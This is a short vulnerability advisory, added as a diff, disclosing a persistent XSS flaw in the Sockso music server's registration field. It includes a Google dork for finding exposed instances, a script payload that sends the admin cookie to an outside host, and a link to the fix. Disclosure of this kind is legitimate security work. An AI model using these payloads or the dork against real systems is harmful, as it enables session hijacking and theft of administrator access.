@@ -1,0 +1,60 @@
+#######################################################################
+
+Application:     Sockso 
+                 http://sockso.pu-gh.com
+Versions:        <= 1.5
+Platforms:       Windows, Mac, Linux
+Bug:             Persistant XSS
+Exploitation:    remote
+Date:            11 May 2012.
+Author:          Ciaran McNally
+Web:             http://smwyg.com/blog/#sockso-persistant-xss-attack
+
+Google Dork:     inurl:"4444" sockso
+
+#######################################################################
+
+1) Bug.
+2) The exploit.
+3) Fix.
+
+#######################################################################
+Sockso is a free, open-source, personal music host server for
+everyone! It's designed to be as simple as possible so that anyone with
+a mouse and some mp3's can get their friends listening to their music
+across the internet in seconds!"
+#######################################################################
+
+======
+1) Bug
+======
+
+On Registration page (normally @ "4444/user/register") the username 
+input is never sanitized. This is then stored in the database of users 
+and displayed in the admin panel & user pages.
+
+#######################################################################
+
+==============
+2) The exploit
+==============
+
+Using a username value of...
+
+<script>alert('xss');</script>
+
+Or the admin cookie session can also be retrieved by using...
+
+<script >new Image().src="bleh.com/xss.php?c="+encodeURI(document.cookie)</script>
+
+
+#######################################################################
+
+======
+3) Fix
+======
+
+https://github.com/rodnaph/sockso/pull/99/files
+
+
+#######################################################################
